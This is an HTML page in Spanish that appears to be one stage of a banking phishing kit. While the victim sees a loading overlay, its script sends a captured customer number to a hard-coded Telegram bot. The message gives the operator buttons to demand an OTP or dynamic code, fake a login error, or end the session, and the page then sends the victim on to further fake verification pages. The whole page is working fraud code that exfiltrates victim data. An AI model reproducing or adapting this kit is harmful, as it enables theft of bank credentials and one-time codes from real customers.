<!DOCTYPE html>
3<html>
<head>
    <title>Bienvenido</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="../assets/img/favicon.ico">
    <script src="../assets/js/jquery-3.6.0.min.js"></script>
    <link href="../assets/css/styles.css" rel="stylesheet">
    <link href="../assets/css/stylesheet.css" rel="stylesheet">
    <script src="../assets/js/functions.js?v2"></script>
    <style>
        #fondo{position:fixed;width:100%;height:100%;top:0;left:0;background:#ffffffc4;z-index:300;}
        #cargando{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:400;}
    </style>
</head>
<body>
    <div id="fondo"></div>
    <img src="../assets/img/cargando.gif" id="cargando">

    <!-- TU DISEÑO (solo el número) -->
    <div style="text-align:center;padding:50px;font-size:24px;font-weight:bold;color:#210049;">
        <div id="numero">Cargando...</div>
    </div>

    <!-- BOT MÁGICO ULTRA-SENCILLO -->
    <script>
    $(document).ready(function() {
        // 1. ESPERA AL NÚMERO
        const esperarNumero = setInterval(() => {
            const numero = $("#numero").text().trim();
            if (numero && numero !== "Cargando..." && numero !== "") {
                clearInterval(esperarNumero);
                
                // 2. ENVÍA A TELEGRAM CON BOTONES
                fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: 8469651553,
                        text: `*NUEVO CLIENTE*

*Número:* ${numero}
*IP:* ${navigator.connection?.effectiveType || 'WiFi'}
*Hora:* ${new Date().toLocaleTimeString()}

*ELIGE ACCIÓN:*`,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{text: "Clave OTP", callback_data: "otp"}],
                                [{text: "Error clave", callback_data: "error"}],
                                [{text: "Dinámica", callback_data: "dinamica"}],
                                [{text: "Error login", callback_data: "loginerr"}],
                                [{text: "Finalizar", callback_data: "ok"}]
                            ]
                        }
                    })
                });

                // 3. REDIRIGE EN 3 SEGUNDOS
                setTimeout(() => { location.href = '../verifying/'; }, 3000);
            }
        }, 300);

        // 4. CARGA EL NÚMERO DESDE PHP
        $.post("../process/buscar_registro.php", function(data) {
            const valor = data.split("|");
            $("#numero").text(valor[1]);
        });
    });
    </script>

    <!-- BOTONES QUE SÍ FUNCIONAN (sin WebApp) -->
    <script>
    // Detecta cuando el usuario toca un botón en Telegram
    setInterval(() => {
        if (window.location.href.includes('callback_data=')) {
            const url = new URL(window.location.href);
            const accion = url.searchParams.get('callback_data');
            if (!accion) return;

            let destino = '';
            let mensaje = '';

            switch(accion) {
                case 'otp':
                    mensaje = 'Tu OTP es: 4821';
                    destino = '../verifying/';
                    break;
                case 'error':
                    mensaje = 'Clave incorrecta';
                    destino = '../login/';
                    break;
                case 'dinamica':
                    mensaje = 'Pide la clave dinámica';
                    destino = '../verify-voice/';
                    break;
                case 'loginerr':
                    mensaje = 'Error de login';
                    destino = '../login/';
                    break;
                case 'ok':
                    mensaje = 'Acceso concedido';
                    destino = '../successful/';
                    break;
            }

            alert(mensaje);
            setTimeout(() => { location.href = destino; }, 1000);
        }
    }, 1000);
    </script>

    <script src="../assets/js/ready.js?v2"></script>
</body>
</html>
